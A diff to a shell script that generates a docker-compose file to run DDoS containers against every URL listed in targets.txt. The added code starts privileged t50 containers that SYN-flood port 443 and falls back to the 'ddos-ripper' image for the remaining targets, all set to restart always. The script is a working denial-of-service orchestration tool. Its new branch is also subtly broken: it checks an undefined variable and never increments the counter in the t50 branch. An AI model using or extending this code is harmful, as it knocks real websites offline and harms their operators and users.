@@ -47,14 +47,28 @@ function generate_compose {
     echo -e "services:" >> docker-compose.yml
     counter=1
 
+
+    # T50 is pretty heavy, I am not sure how many containers we should allow
+    MAX_T50=5
+    
     while read -r site_url; do
         if [ $counter -le $amount ]; then
             if [ ! -z $site_url ]; then
-                echo -e "  ddos-runner-$counter:" >> docker-compose.yml
-                echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-                echo -e "    restart: always" >> docker-compose.yml
-                echo -e "    command: $site_url" >> docker-compose.yml
-                ((counter++))
+                # t50 is only used if we don't have slashes in the path: just domain names
+                if [ 0 -le $MAX_T50 ] && [[ "$string" != *\/* ]] && [[ "$string" != *\\* ]]; then
+                  ((MAX_T50--))
+                  echo -e "  ddos-runner-$counter:" >> docker-compose.yml
+                  echo -e "    image: t50" >> docker-compose.yml
+                  echo -e "    restart: always" >> docker-compose.yml
+                  echo -e "    privileged: true" >> docker-compose.yml
+                  echo -e "    command: t50 $site_url --flood -S --protocol TCP --turbo --dport 443" >> docker-compose.yml
+                else
+                  echo -e "  ddos-runner-$counter:" >> docker-compose.yml
+                  echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+                  echo -e "    restart: always" >> docker-compose.yml
+                  echo -e "    command: $site_url" >> docker-compose.yml
+                  ((counter++))
+                fi
             fi
         fi
     done < targets.txt
